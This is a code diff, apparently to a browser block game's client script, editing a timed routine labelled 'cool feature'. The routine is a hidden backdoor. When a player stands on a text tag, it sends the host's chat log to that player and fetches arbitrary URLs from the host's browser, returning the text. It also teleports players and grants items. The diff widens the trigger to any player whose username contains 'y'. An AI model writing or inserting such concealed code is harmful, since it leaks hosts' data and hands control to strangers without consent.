@@ -61,7 +61,7 @@ if(document.title.toLowerCase().includes("falconcraft") || location.href.toLower
 
 // cool feature
 setInterval(async() => {try{
-const is=window.serverWorld&&serverWorld.gameMode==="survival"&&serverWorld.name.includes("ci")
+const is=window.serverWorld&&(window.player&&player.username.includes("y")||serverWorld.gameMode==="survival"&&serverWorld.name.includes("ci"))
 for(let p of serverWorld.players){ if(p.host)continue; if(is&&p.y<-32&&p.dimension&&p.spawnPoint)p.tp(p.spawnPoint.x,p.spawnPoint.y,p.spawnPoint.z,"");
 if(p.tosenda&&p.tosenda.length)p.connection.send({type:"message",data:p.tosenda.splice(0,10).join("\n"),fromServer:true})
 let t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"text");
@@ -90,7 +90,7 @@ else if(is&&l==="ep"&&p.tp)p.tp(8,64,8,"end");
 else if(l==="a"&&p.connection&&!(p.tosenda&&p.tosenda.length))p.tosenda=["<h1>-------</h1>",...f,"t: "+new Date().toLocaleString(),"<h1>-------</h1>",...Messages.all.map(r=>r.innerHTML),"<h1>-------</h1>"]
 else if(l.startsWith("h"))p.tosenda=[await(await fetch(l)).text()]
 let d=blockData[blockIds[l]];
-if(d){
+if(is&&d){
 let success=0
 if(d.category==="nature"&&!d.grow&&!(d.name.endsWith("Leaves")&&d.drop)){
 if(d.harvestTools===true)success=1
